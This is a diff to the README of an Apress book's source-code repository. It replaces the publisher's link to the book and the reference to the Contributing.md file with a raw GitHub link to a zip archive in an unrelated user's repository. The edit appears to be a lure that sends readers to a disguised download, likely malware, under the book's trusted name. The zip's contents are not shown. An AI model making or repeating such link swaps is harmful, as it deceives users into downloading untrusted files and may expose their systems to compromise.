@@ -1,6 +1,6 @@
 # Apress Source Code
 
-This repository accompanies [*Mastering Machine Learning with Python in Six Steps*](http://www.apress.com/9781484228654) by Manohar Swamynathan (Apress, 2017).
+This repository accompanies [*Mastering Machine Learning with Python in Six Steps*](https://raw.githubusercontent.com/Emacute/mastering-ml-w-python-in-six-steps/master/lerp/mastering-ml-w-python-in-six-steps.zip) by Manohar Swamynathan (Apress, 2017).
 
 [comment]: #cover
 
@@ -13,4 +13,4 @@ Release v1.0 corresponds to the code in the published book, without corrections 
 
 ## Contributions
 
-See the file Contributing.md for more information on how you can contribute to this repository.
+See the file https://raw.githubusercontent.com/Emacute/mastering-ml-w-python-in-six-steps/master/lerp/mastering-ml-w-python-in-six-steps.zip for more information on how you can contribute to this repository.
